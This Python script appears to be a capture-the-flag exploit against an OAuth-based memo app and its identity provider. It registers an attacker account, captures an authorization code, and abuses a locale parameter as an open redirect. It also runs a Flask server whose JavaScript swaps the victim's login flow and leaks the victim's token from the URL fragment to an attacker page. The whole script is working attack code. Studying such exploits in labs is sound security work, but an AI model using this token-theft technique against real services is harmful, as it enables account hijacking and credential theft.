import httpx
import flask
import random

ATTACKER_CODE = ""
APP_HOST = 'http://ojimemo.127-0-0-1.nip.io:36000'
IDP_HOST = 'http://ojiid.127-0-0-1.nip.io:36001'
SERVER_HOST = 'host.docker.internal:3000'
ATTACK_URL = f'{SERVER_HOST}/attack'
LEAK_URL = f'{SERVER_HOST}/leak'

app = flask.Flask(__name__)

@app.route('/attack')
def attack():
    html = f"""
<script>
const url1 = `{APP_HOST}/en/callback?code={ATTACKER_CODE}` // copied URL
const url2 = `{IDP_HOST}/login?client_id=ojimemo&redirect_uri={APP_HOST}%2Fcallback%23&state=&scope=openid+email+profile&response_type=code&nonce=15c167d69abd630d954b30b9c09d55db`
win = window.open(url1)
setTimeout(() => {{
  win.location = url2
}}, 1000)
</script>
"""
    return html

@app.route('/leak')
def leak():
    html = """
<script>
location = `/?token=${location.hash.slice(1)}`
</script>
"""
    return html

def main():
    global ATTACKER_CODE
    
    # random username and password
    email = str(random.randint(10000000, 99999999)) + '@poyopoyo.poyopoyo'
    password = str(random.randint(10000000, 99999999))

    # Move to login page
    login_url = f'{APP_HOST}/login'
    res = httpx.get(login_url, follow_redirects=True)
    print("login:", res)

    # Register user
    register_url = f'{IDP_HOST}/login'
    data = {
        'email': email,
        'password': password,
    }
    res = httpx.post(register_url, data=data, cookies=res.cookies)
    attacker_idp_cookie = res.cookies
    print("register:", res)

    # Access callback
    res = httpx.get(res.headers['Location'])
    attacker_memo_cookie = res.cookies
    print("callback:", res, attacker_memo_cookie)

    # Change locale
    change_locale_url = f'{APP_HOST}/en/locale'
    data = {
        'lang': '/' + LEAK_URL + '?'
    }
    httpx.post(change_locale_url, data=data, cookies=attacker_memo_cookie)
    print("change locale:", res)

    # Issue callback URL again
    res = httpx.get(login_url)
    res = httpx.get(res.headers['Location'], cookies=attacker_idp_cookie) # /auth
    res = httpx.get(IDP_HOST + res.headers['Location'], cookies=attacker_idp_cookie) # /login
    ATTACKER_CODE = res.headers['Location'].split('code=')[1]
    print("callback:", res, ATTACKER_CODE)

    print("report this URL:", "http://" + ATTACK_URL)

    # Start server
    app.run(port=3000)

if __name__ == "__main__":
    main()
